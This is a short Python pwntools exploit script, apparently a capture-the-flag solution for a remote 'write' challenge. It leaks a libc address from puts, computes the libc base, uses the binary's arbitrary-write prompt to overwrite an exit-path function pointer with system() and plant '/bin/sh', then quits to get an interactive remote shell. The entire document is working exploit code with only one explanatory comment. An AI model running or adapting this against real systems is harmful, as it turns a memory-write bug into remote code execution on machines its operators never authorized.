from pwn import *

#R = process('./write')
R = remote('pwn.byteband.it', 9000)

puts_offset = 0x00809c0
exit_funcs_offset = 0x619f60 # originally, pointer to rtld_lock_default_lock_recursive func in this func table.
system_offset = 0x004f440
binsh_offset = 0x619968

def leak_and_calc(r):
    r.recvuntil('puts: ')
    puts_libc = int(r.recvline()[:-1], 16)
    libc_base = puts_libc - puts_offset
    exit_funcs = libc_base + exit_funcs_offset
    system = libc_base + system_offset
    dst_binsh = libc_base + binsh_offset
    return exit_funcs, system, dst_binsh

def run_shell(r, exit_funcs, system, dst_binsh):
    r.sendline('w')
    r.sendlineafter('ptr: ', str(exit_funcs))
    r.sendlineafter('val:', str(system))
    binsh_num = 0x0068732f6e69622f # "/bin/sh\x00"
    r.sendline('w')
    r.sendlineafter('ptr: ', str(dst_binsh))
    r.sendlineafter('val:', str(binsh_num))
    r.sendline('q')
    r.interactive()

def main(r):
    exit_funcs, system, dst_binsh = leak_and_calc(r)
    run_shell(r, exit_funcs, system, dst_binsh)

if __name__ == '__main__':
    main(R)
